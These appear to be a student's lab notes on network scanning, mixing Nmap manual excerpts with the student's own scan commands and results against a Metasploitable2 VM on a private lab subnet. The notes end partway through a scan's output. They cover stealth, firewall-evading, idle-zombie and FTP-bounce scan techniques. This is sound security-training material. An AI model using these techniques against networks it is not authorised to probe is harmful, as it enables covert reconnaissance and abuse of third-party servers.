[01Lab_VA .pdf](01Lab_VA%20.pdf)
# Notes
## https://nmap.org/book/man-host-discovery.html
- To perform an host discovery a security auditor can engage the network with arbitrary combinations of multi-port TCP SYN/ACK, UDP, SCTP INIT and ICMP probes. The goal of these probes is to solicit responses which demonstrate that an IP address is actually active (is being used by a host or network device). If no host discovery options are given, Nmap sends an ICMP echo request, a TCP SYN packet to port 443, a TCP ACK packet to port 80, and an ICMP timestamp request. ( These defaults are equivalent to the -PE -PS443 -PA80 -PP options. ) The ARP (for IPv4) and Neighbor Discovery (for IPv6) scans are used by default for any targets on a local ethernet network even if you specify other -P* options, because it is almost always faster and more effective. By default, Nmap does host discovery and then performs a port scan against each host it determines is online. This is true even if you specify non-default host discovery types such as UDP probes (-PU). 

- Users can skip the discovery step entirely with a list scan (-sL) or by disabling host discovery (-Pn): 

- -sL (List Scan) The list scan is a degenerate form of host discovery that simply lists each host of the network(s) specified, without sending any packets to the target hosts. By default, Nmap still does reverse-DNS resolution on the hosts to learn their names. Nmap also reports the total number of IP addresses at the end. The list scan is a good sanity check to ensure that you have proper IP addresses for your targets. Since the idea is to simply print a list of target hosts, options for higher level functionality such as port scanning, OS detection, or host discovery cannot be combined with this. 

- -sn (No port scan) This option tells Nmap not to do a port scan after host discovery, and only print out the available hosts that responded to the host discovery probes. This is often known as a “ping scan”, but you can also request that traceroute and NSE host scripts be run. This is by default one step more intrusive than the list scan, and can often be used for the same purposes. It allows light reconnaissance of a target network without attracting much attention. Knowing how many hosts are up is more valuable to attackers than the list provided by list scan of every single IP and host name. The default host discovery done with -sn consists of an ICMP echo request, TCP SYN to port 443, TCP ACK to port 80, and an ICMP timestamp request by default. When a privileged user tries to scan targets on a local ethernet network, ARP requests are used unless --send-ip was specified. The -sn option can be combined with any of the discovery probe types (the -P* options) for greater flexibility. 

- -Pn (No ping) This option skips the host discovery stage altogether. Normally, Nmap uses this stage to determine active machines for heavier scanning and to gauge the speed of the network. By default, Nmap only performs heavy probing such as port scans, version detection, or OS detection against hosts that are found to be up. Disabling host discovery with -Pn causes Nmap to attempt the requested scanning functions against every target IP address specified. To skip host discovery and port scan, while still allowing NSE to run, use the two options -Pn -sn together. For machines on a local ethernet network, ARP scanning will still be performed (unless --disable-arp-ping or --send-ip is specified) because Nmap needs MAC addresses to further scan target hosts. 

- -PS <port list> (TCP SYN Ping) This option sends an empty TCP packet with the SYN flag set. The default destination port is 80 (configurable at compile time by changing DEFAULT_TCP_PROBE_PORT_SPEC in nmap.h). Alternate ports can be specified as a parameter. Examples are -PS 22 and -PS 22-25,80,113,1050,35000. The SYN flag suggests to the remote system that you are attempting to establish a connection. Normally the destination port will be closed, and a RST (reset) packet sent back. If the port happens to be open, the target will take the second step of a TCP three-way-handshake by responding with a SYN/ACK TCP packet. The machine running Nmap then tears down the nascent connection by responding with a RST rather than sending an ACK packet which would complete the three-way-handshake and establish a full connection. The RST packet is sent by the kernel of the machine running Nmap in response to the unexpected SYN/ACK, not by Nmap itself. Nmap does not care whether the port is open or closed. Either the RST or SYN/ACK response discussed previously tell Nmap that the host is available and responsive. 

- -PA <port list> (TCP ACK Ping) The TCP ACK ping is quite similar to the just-discussed SYN ping. The difference, as you could likely guess, is that the TCP ACK flag is set instead of the SYN flag. Such an ACK packet purports to be acknowledging data over an established TCP connection, but no such connection exists. So remote hosts should always respond with a RST packet, disclosing their existence in the process. The -PA option uses the same default port as the SYN probe (80) and can also take a list of destination ports in the same format. The reason for offering both SYN and ACK ping probes is to maximize the chances of bypassing firewalls. Many administrators configure routers and other simple firewalls to block incoming SYN packets except for those destined for public services like the company web site or mail server. This prevents other incoming connections to the organization, while allowing users to make unobstructed outgoing connections to the Internet. This non-stateful approach takes up few resources on the firewall/router and is widely supported by hardware and software filters. The Linux Netfilter/iptables firewall software offers the --syn convenience option to implement this stateless approach. When stateless firewall rules such as this are in place, SYN ping probes (-PS) are likely to be blocked when sent to closed target ports. In such cases, the ACK probe shines as it cuts right through these rules. Another common type of firewall uses stateful rules that drop unexpected packets. This feature was initially found mostly on high-end firewalls, though it has become much more common over the years. The Linux Netfilter/iptables system supports this through the --state option, which categorizes packets based on connection state. A SYN probe is more likely to work against such a system, as unexpected ACK packets are generally recognized as bogus and dropped. A solution to this quandary is to send both SYN and ACK probes by specifying -PS and -PA. 

- -PU <port list> (UDP Ping) Another host discovery option is the UDP ping, which sends a UDP packet to the given ports. For most ports, the packet will be empty, though some use a protocol-specific payload that is more likely to elicit a response. See the section called “UDP payloads: nmap-payloads” for a description of the database of payloads. Packet content can also be affected with the --data, --data-string, and --data-length options. The port list takes the same format as with the previously discussed -PS and -PA options. If no ports are specified, the default is 40125. A highly uncommon port is used by default because sending to open ports is often undesirable for this particular scan type. Upon hitting a closed port on the target machine, the UDP probe should elicit an ICMP port unreachable packet in return. This signifies to Nmap that the machine is up and available. Many other types of ICMP errors, such as host/network unreachables or TTL exceeded are indicative of a down or unreachable host. A lack of response is also interpreted this way. If an open port is reached, most services simply ignore the empty packet and fail to return any response. This is why the default probe port is 40125, which is highly unlikely to be in use. A few services, such as the Character Generator (chargen) protocol, will respond to an empty UDP packet, and thus disclose to Nmap that the machine is available. The primary advantage of this scan type is that it bypasses firewalls and filters that only screen TCP.  

- -PY <port list> (SCTP INIT Ping) This option sends an SCTP packet containing a minimal INIT chunk. The default destination port is 80. The INIT chunk suggests to the remote system that you are attempting to establish an association. Normally the destination port will be closed, and an ABORT chunk will be sent back. If the port happens to be open, the target will take the second step of an SCTP four-way-handshake by responding with an INIT-ACK chunk. If the machine running Nmap has a functional SCTP stack, then it tears down the nascent association by responding with an ABORT chunk rather than sending a COOKIE-ECHO chunk which would be the next step in the four-way-handshake. Nmap does not care whether the port is open or closed. Either the ABORT or INIT-ACK response discussed previously tell Nmap that the host is available and responsive. 

- -PE; -PP; -PM (ICMP Ping Types) Nmap can send the standard packets sent by the ubiquitous ping program. Nmap sends an ICMP type 8 (echo request) packet to the target IP addresses, expecting a type 0 (echo reply) in return from available hosts. Unfortunately for network explorers, many hosts and firewalls now block these packets, rather than responding as required by RFC 1122. For this reason, ICMP-only scans are rarely reliable enough against unknown targets over the Internet. But for system administrators monitoring an internal network, they can be a practical and efficient approach. Use the -PE option to enable this echo request behavior. While echo request is the standard ICMP ping query, Nmap does not stop there. The ICMP standards (RFC 792 and RFC 950 ) also specify timestamp request, information request, and address mask request packets as codes 13, 15, and 17, respectively. While the ostensible purpose for these queries is to learn information such as address masks and current times, they can easily be used for host discovery. A system that replies is up and available. Nmap does not currently implement information request packets, as they are not widely supported. RFC 1122 insists that “a host SHOULD NOT implement these messages”. Timestamp and address mask queries can be sent with the -PP and -PM options, respectively. A timestamp reply (ICMP code 14) or address mask reply (code 18) discloses that the host is available. These two queries can be valuable when administrators specifically block echo request packets while forgetting that other ICMP queries can be used for the same purpose. 

- -PO <protocol list> (IP Protocol Ping) One of the newer host discovery options is the IP protocol ping, which sends IP packets with the specified protocol number set in their IP header. The protocol list takes the same format as do port lists in the previously discussed TCP, UDP and SCTP host discovery options. If no protocols are specified, the default is to send multiple IP packets for ICMP (protocol 1), IGMP (protocol 2), and IP-in-IP (protocol 4)Note that for the ICMP, IGMP, TCP (protocol 6), UDP (protocol 17) and SCTP (protocol 132), the packets are sent with the proper protocol headers while other protocols are sent with no additional data beyond the IP header (unless any of --data, --data-string, or --data-length options are specified). This host discovery method looks for either responses using the same protocol as a probe, or ICMP protocol unreachable messages which signify that the given protocol isn't supported on the destination host. Either type of response signifies that the target host is alive. 

- --disable-arp-ping (No ARP or ND Ping) Nmap normally does ARP or IPv6 Neighbor Discovery (ND) discovery of locally connected ethernet hosts, even if other host discovery options such as -Pn or -PE are used. To disable this implicit behavior, use the --disable-arp-ping option. The default behavior is normally faster, but this option is useful on networks using proxy ARP, in which a router speculatively replies to all ARP requests, making every target appear to be up according to ARP scan. 

- --discovery-ignore-rst In some cases, firewalls may spoof TCP reset (RST) replies in response to probes to unoccupied or disallowed addresses. Since Nmap ordinarily considers RST replies to be proof that the target is up, this can lead to wasted time scanning targets that aren't there. Using the --discovery-ignore-rst will prevent Nmap from considering these replies during host discovery. You may need to select extra host discovery options to ensure you don't miss targets in this case. 

- --traceroute (Trace path to host) Traceroutes are performed post-scan using information from the scan results to determine the port and protocol most likely to reach the target. It works with all scan types except connect scans (-sT) and idle scans (-sI). All traces use Nmap's dynamic timing model and are performed in parallel.Traceroute works by sending packets with a low TTL (time-to-live) in an attempt to elicit ICMP Time Exceeded messages from intermediate hops between the scanner and the target host. Standard traceroute implementations start with a TTL of 1 and increment the TTL until the destination host is reached. Nmap's traceroute starts with a high TTL and then decrements the TTL until it reaches zero. Doing it backwards lets Nmap employ clever caching algorithms to speed up traces over multiple hosts. On average Nmap sends 5–10 fewer packets per host, depending on network conditions. If a single subnet is being scanned (i.e. 192.168.0.0/24) Nmap may only have to send two packets to most hosts. 

- -n (No DNS resolution) Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds. Since DNS can be slow even with Nmap's built-in parallel stub resolver, this option can slash scanning times. 

- -R (DNS resolution for all targets) Tells Nmap to always do reverse DNS resolution on the target IP addresses. Normally reverse DNS is only performed against responsive (online) hosts. 

- --resolve-all (Scan each resolved address) If a hostname target resolves to more than one address, scan all of them. The default behavior is to only scan the first resolved address. Regardless, only addresses in the appropriate address family will be scanned: IPv4 by default, IPv6 with -6. 

- --system-dns (Use system DNS resolver) By default, Nmap reverse-resolves IP addresses by sending queries directly to the name servers configured on your host and then listening for responses. Many requests (often dozens) are performed in parallel to improve performance. Specify this option to use your system resolver instead (one IP at a time via the getnameinfo call). This is slower and rarely useful unless you find a bug in the Nmap parallel resolver (please let us know if you do). The system resolver is always used for forward lookups (getting an IP address from a hostname). 

- --dns-servers <server1>[,<server2>[,...]] (Servers to use for reverse DNS queries) By default, Nmap determines your DNS servers (for rDNS resolution) from your resolv.conf file (Unix) or the Registry (Win32). Alternatively, you may use this option to specify alternate servers. This option is not honored if you are using --system-dns. Using multiple DNS servers is often faster, especially if you choose authoritative servers for your target IP space. This option can also improve stealth, as your requests can be bounced off just about any recursive DNS server on the Internet. This option also comes in handy when scanning private networks. Sometimes only a few name servers provide proper rDNS information, and you may not even know where they are. You can scan the network for port 53 (perhaps with version detection), then try Nmap list scans (-sL) specifying each name server one at a time with --dns-servers until you find one which works. This option might not be honored if the DNS response exceeds the size of a UDP packet. In such a situation our DNS resolver will make the best effort to extract a response from the truncated packet, and if not successful it will fall back to using the system resolver. Also, responses that contain CNAME aliases will fall back to the system resolver. 
## 2.1

- Write down the commands to execute a scanning of the range of IP addresses where you expect to find the Metasploitable2 VM.

I use the 10.0.2.0/24 which is the subnet shared by the 2 VMs.

```
nmap -v -sL 10.0.2.0/24
Initiating Parallel DNS resolution of 256 hosts. at 13:40
Completed Parallel DNS resolution of 256 hosts. at 13:41, 21.30s elapsed

Nmap done: 256 IP addresses (0 hosts up) scanned in 21.31 seconds
```
only reverse-DNS resolution didn't find any host in the network
```
nmap -v -sn 10.0.2.0/24
Initiating ARP Ping Scan at 13:41
Scanning 255 hosts [1 port/host]
Completed ARP Ping Scan at 13:41, 1.99s elapsed (255 total hosts)
Initiating Parallel DNS resolution of 4 hosts. at 13:41
Completed Parallel DNS resolution of 4 hosts. at 13:41, 0.16s elapsed

Nmap scan report for 10.0.2.1
Host is up (0.0035s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 10.0.2.2
Host is up (0.0019s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 10.0.2.3
Host is up (0.00018s latency).
MAC Address: 08:00:27:69:D5:4D (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.9
Host is up (0.00023s latency).
MAC Address: 08:00:27:4E:F5:4B (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.8
Host is up.

Initiating Parallel DNS resolution of 1 host. at 13:41
Completed Parallel DNS resolution of 1 host. at 13:41, 0.20s elapsed
Nmap scan report for 10.0.2.8
Host is up.
Read data files from: /usr/bin/../share/nmap
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.45 seconds
           Raw packets sent: 511 (14.308KB) | Rcvd: 9 (252B)

```
This prints the hosts found, without looking for each port.
```
nmap -v -sn 10.0.2.0/24 --disable-arp-ping
...
Nmap done: 256 IP addresses (5 hosts up) scanned in 20.32 seconds
```
This gives the same result but takes 10x the time!


- To output the scan result to XML use -oX flag.
## https://nmap.org/book/nping-man-output-options.html
- -v-4 (level -4) up to -v4 (level 4) levels of verbosity 
- -d0 up to -d6 levels of debugging info
- At this point, you can start with a deeper analysis:  the port scanning.  Identify the IP address of your targetMetasploitable2 VM and test different port scanning techniques among the ones offered by nmap. Annotate the peculiarities of each scanning and compare what you have experienced against the nmap manual.
## https://nmap.org/book/port-scanning-tutorial.html
The simple command nmap <target> scans the most commonly used 1,000 TCP ports on the host <target>, classifying each port into the state open, closed, filtered, unfiltered, open|filtered, or closed|filtered. Ports are simply a software abstraction, used to distinguish between communication channels. Similar to the way IP addresses are used to identify machines on networks, ports identify specific applications in use on a single machine. Because most popular services are registered to a well-known port number, one can often guess what services open ports represent. Nmap includes an nmap-services file, containing the well-known service for registered port and protocol numbers, as well as common ports for trojan backdoors and other applications that don't bother registering with the Internet Assigned Numbers Authority (IANA). Nmap prints this service name for reference along with the port number. Because the port number field is 16-bits wide, values can reach 65,535. The lowest possible value, zero, is invalid. The Berkeley sockets API, which defines how programs are usually written for network communication, does not allow port zero to be used as such. Instead, it interprets a port zero request as a wildcard, meaning that the programmer does not care which is used. The system then chooses an available port number. For example, programmers rarely care what source port number is used for an outgoing connection. So they set it to zero and let the operating system choose one. While port zero is invalid, nothing stops someone from specifying it in the header field. Some malicious trojan backdoors listen on port zero of compromised systems as a stealthy way to offer illegitimate access without appearing on most port scans. To combat this, Nmap does allow scanning of port zero when it is specified explicitly (e.g. -p0-65535).

nmap <target> does the following:

1. Converts <target> from a hostname into an IPv4 address using DNS. If an IP address is specified instead of a hostname this lookup is skipped.

2. Pings the host, by default with an ICMP echo request packet and a TCP ACK packet to port 80, to determine whether it is up and running. If not, Nmap reports that fact and exits. I could have specified -Pn to skip this test. See Chapter 3, Host Discovery (“Ping Scanning”).

3. Converts the target IP address back to the name using a reverse-DNS query. Because of the way DNS works, the reverse name may not be the same as the <target> specified on the command-line. This query can be skipped with the -n option to improve speed and stealthiness.

4. Launches a TCP port scan of the most popular 1,000 ports listed in nmap-services. A SYN stealth scan is usually used, but connect scan is substituted instead for non-root Unix users who lack the privileges necessary to send raw packets.

5. Prints the results to standard output in normal human-readable format, and exits. Other output formats and locations (files) can be specified, as described in Chapter 13, Nmap Output Formats. Example 4.2 displays the results when scanme.nmap.org is used as <target>.

- -p0- asks Nmap to scan every possible TCP port (included port 0)
- -A (Aggressive scan options)
This option enables additional advanced and aggressive options. Presently this enables OS detection (-O), version scanning (-sV), script scanning (-sC) and traceroute (--traceroute). More features may be added in the future. The point is to enable a comprehensive set of scan options without people having to remember a large set of flags. However, because script scanning with the default set is considered intrusive, you should not use -A against target networks without permission. This option only enables features, and not timing options (such as -T4) or verbosity options (-v) that you might want as well. Options which require privileges (e.g. root access) such as OS detection and traceroute will only be enabled if those privileges are available.

## https://nmap.org/book/man-host-discovery.html
Experts understand the dozens of scan techniques and choose the appropriate one (or combination) for a given task. Inexperienced users and script kiddies, on the other hand, try to solve every problem with the default SYN scan. Since Nmap is free, the only barrier to port scanning mastery is knowledge.
Most of the scan types are only available to privileged users. This is because they send and receive raw packets, which requires root access on Unix systems.
While Nmap attempts to produce accurate results, keep in mind that all of its insights are based on packets returned by the target machines (or firewalls in front of them). Such hosts may be untrustworthy and send responses intended to confuse or mislead Nmap. Much more common are non-RFC-compliant hosts that do not respond as they should to Nmap probes. FIN, NULL, and Xmas scans are particularly susceptible to this problem.
Only one method may be used at a time, except that UDP scan (-sU) and any one of the SCTP scan types (-sY, -sZ) may be combined with any one of the TCP scan types. As a memory aid, port scan type options are of the form -s<C>, where <C> is a prominent character in the scan name, usually the first.
- -sS (TCP SYN scan)
SYN scan is the default and most popular scan option for good reasons. It can be performed quickly, scanning thousands of ports per second on a fast network not hampered by restrictive firewalls. It is also relatively unobtrusive and stealthy since it never completes TCP connections. SYN scan works against any compliant TCP stack rather than depending on idiosyncrasies of specific platforms as Nmap's FIN/NULL/Xmas, Maimon and idle scans do. It also allows clear, reliable differentiation between the open, closed, and filtered states.
This technique is often referred to as half-open scanning, because you don't open a full TCP connection. You send a SYN packet, as if you are going to open a real connection and then wait for a response. A SYN/ACK indicates the port is listening (open), while a RST (reset) is indicative of a non-listener. If no response is received after several retransmissions, the port is marked as filtered. The port is also marked filtered if an ICMP unreachable error (type 3, code 0, 1, 2, 3, 9, 10, or 13) is received. The port is also considered open if a SYN packet (without the ACK flag) is received in response. This can be due to an extremely rare TCP feature known as a simultaneous open or split handshake connection (see https://nmap.org/misc/split-handshake.pdf).

- -sT (TCP connect scan)
TCP connect scan is the default TCP scan type when SYN scan is not an option. This is the case when a user does not have raw packet privileges. Instead of writing raw packets as most other scan types do, Nmap asks the underlying operating system to establish a connection with the target machine and port by issuing the connect system call. This is the same high-level system call that web browsers, P2P clients, and most other network-enabled applications use to establish a connection. It is part of a programming interface known as the Berkeley Sockets API. Rather than read raw packet responses off the wire, Nmap uses this API to obtain status information on each connection attempt.
When SYN scan is available, it is usually a better choice. Nmap has less control over the high level connect call than with raw packets, making it less efficient. The system call completes connections to open target ports rather than performing the half-open reset that SYN scan does. Not only does this take longer and require more packets to obtain the same information, but target machines are more likely to log the connection. A decent IDS will catch either, but most machines have no such alarm system. Many services on your average Unix system will add a note to syslog, and sometimes a cryptic error message, when Nmap connects and then closes the connection without sending data. Truly pathetic services crash when this happens, though that is uncommon. An administrator who sees a bunch of connection attempts in her logs from a single system should know that she has been connect scanned.

- -sU (UDP scans)
While most popular services on the Internet run over the TCP protocol, UDP services are widely deployed. DNS, SNMP, and DHCP (registered ports 53, 161/162, and 67/68) are three of the most common. Because UDP scanning is generally slower and more difficult than TCP, some security auditors ignore these ports. This is a mistake, as exploitable UDP services are quite common and attackers certainly don't ignore the whole protocol. Fortunately, Nmap can help inventory UDP ports.
UDP scan is activated with the -sU option. It can be combined with a TCP scan type such as SYN scan (-sS) to check both protocols during the same run.
UDP scan works by sending a UDP packet to every targeted port. For some common ports such as 53 and 161, a protocol-specific payload is sent to increase response rate, but for most ports the packet is empty unless the --data, --data-string, or --data-length options are specified. If an ICMP port unreachable error (type 3, code 3) is returned, the port is closed. Other ICMP unreachable errors (type 3, codes 0, 1, 2, 9, 10, or 13) mark the port as filtered. Occasionally, a service will respond with a UDP packet, proving that it is open. If no response is received after retransmissions, the port is classified as open|filtered. This means that the port could be open, or perhaps packet filters are blocking the communication. Version detection (-sV) can be used to help differentiate the truly open ports from the filtered ones.
A big challenge with UDP scanning is doing it quickly. Open and filtered ports rarely send any response, leaving Nmap to time out and then conduct retransmissions just in case the probe or response were lost. Closed ports are often an even bigger problem. They usually send back an ICMP port unreachable error. But unlike the RST packets sent by closed TCP ports in response to a SYN or connect scan, many hosts rate limit ICMP port unreachable messages by default. Linux and Solaris are particularly strict about this. For example, the Linux 2.4.20 kernel limits destination unreachable messages to one per second (in net/ipv4/icmp.c).
Nmap detects rate limiting and slows down accordingly to avoid flooding the network with useless packets that the target machine will drop. Unfortunately, a Linux-style limit of one packet per second makes a 65,536-port scan take more than 18 hours. Ideas for speeding your UDP scans up include scanning more hosts in parallel, doing a quick scan of just the popular ports first, scanning from behind the firewall, and using --host-timeout to skip slow hosts.

- -sY (SCTP INIT scan)
SCTP is a relatively new alternative to the TCP and UDP protocols, combining most characteristics of TCP and UDP, and also adding new features like multi-homing and multi-streaming. It is mostly being used for SS7/SIGTRAN related services but has the potential to be used for other applications as well. SCTP INIT scan is the SCTP equivalent of a TCP SYN scan. It can be performed quickly, scanning thousands of ports per second on a fast network not hampered by restrictive firewalls. Like SYN scan, INIT scan is relatively unobtrusive and stealthy, since it never completes SCTP associations. It also allows clear, reliable differentiation between the open, closed, and filtered states.
This technique is often referred to as half-open scanning, because you don't open a full SCTP association. You send an INIT chunk, as if you are going to open a real association and then wait for a response. An INIT-ACK chunk indicates the port is listening (open), while an ABORT chunk is indicative of a non-listener. If no response is received after several retransmissions, the port is marked as filtered. The port is also marked filtered if an ICMP unreachable error (type 3, code 0, 1, 2, 3, 9, 10, or 13) is received.

- -sN; -sF; -sX (TCP NULL, FIN, and Xmas scans)
These three scan types (even more are possible with the --scanflags option described in the next section) exploit a subtle loophole in the TCP RFC to differentiate between open and closed ports. Page 65 of RFC 793 says that “if the [destination] port state is CLOSED .... an incoming segment not containing a RST causes a RST to be sent in response.” Then the next page discusses packets sent to open ports without the SYN, RST, or ACK bits set, stating that: “you are unlikely to get here, but if you do, drop the segment, and return.”
When scanning systems compliant with this RFC text, any packet not containing SYN, RST, or ACK bits will result in a returned RST if the port is closed and no response at all if the port is open. As long as none of those three bits are included, any combination of the other three (FIN, PSH, and URG) are OK. Nmap exploits this with three scan types:
  - Null scan (-sN)
Does not set any bits (TCP flag header is 0)
  - FIN scan (-sF)
Sets just the TCP FIN bit.
  - Xmas scan (-sX)
Sets the FIN, PSH, and URG flags, lighting the packet up like a Christmas tree.

These three scan types are exactly the same in behavior except for the TCP flags set in probe packets. If a RST packet is received, the port is considered closed, while no response means it is open|filtered. The port is marked filtered if an ICMP unreachable error (type 3, code 0, 1, 2, 3, 9, 10, or 13) is received.
The key advantage to these scan types is that they can sneak through certain non-stateful firewalls and packet filtering routers. Another advantage is that these scan types are a little more stealthy than even a SYN scan. Don't count on this though—most modern IDS products can be configured to detect them. The big downside is that not all systems follow RFC 793 to the letter. A number of systems send RST responses to the probes regardless of whether the port is open or not. This causes all of the ports to be labeled closed. Major operating systems that do this are Microsoft Windows, many Cisco devices, BSDI, and IBM OS/400. This scan does work against most Unix-based systems though. Another downside of these scans is that they can't distinguish open ports from certain filtered ones, leaving you with the response open|filtered.

- -sA (TCP ACK scan)
This scan is different than the others discussed so far in that it never determines open (or even open|filtered) ports. It is used to map out firewall rulesets, determining whether they are stateful or not and which ports are filtered.
The ACK scan probe packet has only the ACK flag set (unless you use --scanflags). When scanning unfiltered systems, open and closed ports will both return a RST packet. Nmap then labels them as unfiltered, meaning that they are reachable by the ACK packet, but whether they are open or closed is undetermined. Ports that don't respond, or send certain ICMP error messages back (type 3, code 0, 1, 2, 3, 9, 10, or 13), are labeled filtered.

- -sW (TCP Window scan)
Window scan is exactly the same as ACK scan except that it exploits an implementation detail of certain systems to differentiate open ports from closed ones, rather than always printing unfiltered when a RST is returned. It does this by examining the TCP Window field of the RST packets returned. On some systems, open ports use a positive window size (even for RST packets) while closed ones have a zero window. So instead of always listing a port as unfiltered when it receives a RST back, Window scan lists the port as open or closed if the TCP Window value in that reset is positive or zero, respectively.
This scan relies on an implementation detail of a minority of systems out on the Internet, so you can't always trust it. Systems that don't support it will usually return all ports closed. Of course, it is possible that the machine really has no open ports. If most scanned ports are closed but a few common port numbers (such as 22, 25, 53) are filtered, the system is most likely susceptible. Occasionally, systems will even show the exact opposite behavior. If your scan shows 1,000 open ports and three closed or filtered ports, then those three may very well be the truly open ones.

- -sM (TCP Maimon scan)
The Maimon scan is named after its discoverer, Uriel Maimon. He described the technique in Phrack Magazine issue #49 (November 1996). Nmap, which included this technique, was released two issues later. This technique is exactly the same as NULL, FIN, and Xmas scans, except that the probe is FIN/ACK. According to RFC 793 (TCP), a RST packet should be generated in response to such a probe whether the port is open or closed. However, Uriel noticed that many BSD-derived systems simply drop the packet if the port is open.

- --scanflags (Custom TCP scan)
Truly advanced Nmap users need not limit themselves to the canned scan types offered. The --scanflags option allows you to design your own scan by specifying arbitrary TCP flags. Let your creative juices flow, while evading intrusion detection systems whose vendors simply paged through the Nmap man page adding specific rules!
The --scanflags argument can be a numerical flag value such as 9 (PSH and FIN), but using symbolic names is easier. Just mash together any combination of URG, ACK, PSH, RST, SYN, and FIN. For example, --scanflags URGACKPSHRSTSYNFIN sets everything, though it's not very useful for scanning. The order these are specified in is irrelevant.
In addition to specifying the desired flags, you can specify a TCP scan type (such as -sA or -sF). That base type tells Nmap how to interpret responses. For example, a SYN scan considers no-response to indicate a filtered port, while a FIN scan treats the same as open|filtered. Nmap will behave the same way it does for the base scan type, except that it will use the TCP flags you specify instead. If you don't specify a base type, SYN scan is used.

- -sZ (SCTP COOKIE ECHO scan)
SCTP COOKIE ECHO scan is a more advanced SCTP scan. It takes advantage of the fact that SCTP implementations should silently drop packets containing COOKIE ECHO chunks on open ports, but send an ABORT if the port is closed. The advantage of this scan type is that it is not as obvious a port scan than an INIT scan. Also, there may be non-stateful firewall rulesets blocking INIT chunks, but not COOKIE ECHO chunks. Don't be fooled into thinking that this will make a port scan invisible; a good IDS will be able to detect SCTP COOKIE ECHO scans too. The downside is that SCTP COOKIE ECHO scans cannot differentiate between open and filtered ports, leaving you with the state open|filtered in both cases.

- -sI <zombie host>[:<probeport>] (idle scan)
This advanced scan method allows for a truly blind TCP port scan of the target (meaning no packets are sent to the target from your real IP address). Instead, a unique side-channel attack exploits predictable IP fragmentation ID sequence generation on the zombie host to glean information about the open ports on the target. IDS systems will display the scan as coming from the zombie machine you specify (which must be up and meet certain criteria). Full details of this fascinating scan type are in the section called “TCP Idle Scan (-sI)”.
Besides being extraordinarily stealthy (due to its blind nature), this scan type permits mapping out IP-based trust relationships between machines. The port listing shows open ports from the perspective of the zombie host. So you can try scanning a target using various zombies that you think might be trusted (via router/packet filter rules).
You can add a colon followed by a port number to the zombie host if you wish to probe a particular port on the zombie for IP ID changes. Otherwise Nmap will use the port it uses by default for TCP pings (80).

- -sO (IP protocol scan)
IP protocol scan allows you to determine which IP protocols (TCP, ICMP, IGMP, etc.) are supported by target machines. This isn't technically a port scan, since it cycles through IP protocol numbers rather than TCP or UDP port numbers. Yet it still uses the -p option to select scanned protocol numbers, reports its results within the normal port table format, and even uses the same underlying scan engine as the true port scanning methods. So it is close enough to a port scan that it belongs here.
Besides being useful in its own right, protocol scan demonstrates the power of open-source software. While the fundamental idea is pretty simple, I had not thought to add it nor received any requests for such functionality. Then in the summer of 2000, Gerhard Rieger conceived the idea, wrote an excellent patch implementing it, and sent it to the announce mailing list (then called nmap-hackers). I incorporated that patch into the Nmap tree and released a new version the next day. Few pieces of commercial software have users enthusiastic enough to design and contribute their own improvements!
Protocol scan works in a similar fashion to UDP scan. Instead of iterating through the port number field of a UDP packet, it sends IP packet headers and iterates through the eight-bit IP protocol field. The headers are usually empty, containing no data and not even the proper header for the claimed protocol. The exceptions are TCP, UDP, ICMP, SCTP, and IGMP. A proper protocol header for those is included since some systems won't send them otherwise and because Nmap already has functions to create them. Instead of watching for ICMP port unreachable messages, protocol scan is on the lookout for ICMP protocol unreachable messages. If Nmap receives any response in any protocol from the target host, Nmap marks that protocol as open. An ICMP protocol unreachable error (type 3, code 2) causes the protocol to be marked as closed while port unreachable (type 3, code 3) marks the protocol open. Other ICMP unreachable errors (type 3, code 0, 1, 9, 10, or 13) cause the protocol to be marked filtered (though they prove that ICMP is open at the same time). If no response is received after retransmissions, the protocol is marked open|filtered

- -b <FTP relay host> (FTP bounce scan)
An interesting feature of the FTP protocol (RFC 959) is support for so-called proxy FTP connections. This allows a user to connect to one FTP server, then ask that files be sent to a third-party server. Such a feature is ripe for abuse on many levels, so most servers have ceased supporting it. One of the abuses this feature allows is causing the FTP server to port scan other hosts. Simply ask the FTP server to send a file to each interesting port of a target host in turn. The error message will describe whether the port is open or not. This is a good way to bypass firewalls because organizational FTP servers are often placed where they have more access to other internal hosts than any old Internet host would. Nmap supports FTP bounce scan with the -b option. It takes an argument of the form <username>:<password>@<server>:<port>. <Server> is the name or IP address of a vulnerable FTP server. As with a normal URL, you may omit <username>:<password>, in which case anonymous login credentials (user: anonymous password:-wwwuser@) are used. The port number (and preceding colon) may be omitted as well, in which case the default FTP port (21) on <server> is used.
This vulnerability was widespread in 1997 when Nmap was released, but has largely been fixed. Vulnerable servers are still around, so it is worth trying when all else fails. If bypassing a firewall is your goal, scan the target network for port 21 (or even for any FTP services if you scan all ports with version detection) and use the ftp-bounce NSE script. Nmap will tell you whether the host is vulnerable or not. If you are just trying to cover your tracks, you don't need to (and, in fact, shouldn't) limit yourself to hosts on the target network. Before you go scanning random Internet addresses for vulnerable FTP servers, consider that sysadmins may not appreciate you abusing their servers in this way.



### No host discovery scan
```
nmap -Pn -v 10.0.2.0/24 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-17 14:35 CEST
Initiating ARP Ping Scan at 14:35
Scanning 255 hosts [1 port/host]
Completed ARP Ping Scan at 14:35, 2.12s elapsed (255 total hosts)
Initiating Parallel DNS resolution of 4 hosts. at 14:35
Completed Parallel DNS resolution of 4 hosts. at 14:35, 0.11s elapsed
Initiating Parallel DNS resolution of 1 host. at 14:35
Completed Parallel DNS resolution of 1 host. at 14:35, 0.14s elapsed
Initiating SYN Stealth Scan at 14:35
Scanning 4 hosts [1000 ports/host]
Discovered open port 80/tcp on 10.0.2.9
Discovered open port 23/tcp on 10.0.2.9
Discovered open port 21/tcp on 10.0.2.9
Discovered open port 22/tcp on 10.0.2.9
Discovered open port 139/tcp on 10.0.2.9
Discovered open port 111/tcp on 10.0.2.9
Discovered open port 53/tcp on 10.0.2.9
Discovered open port 53/tcp on 10.0.2.1
Discovered open port 5900/tcp on 10.0.2.9
Discovered open port 445/tcp on 10.0.2.9
Discovered open port 25/tcp on 10.0.2.9
Discovered open port 3306/tcp on 10.0.2.9
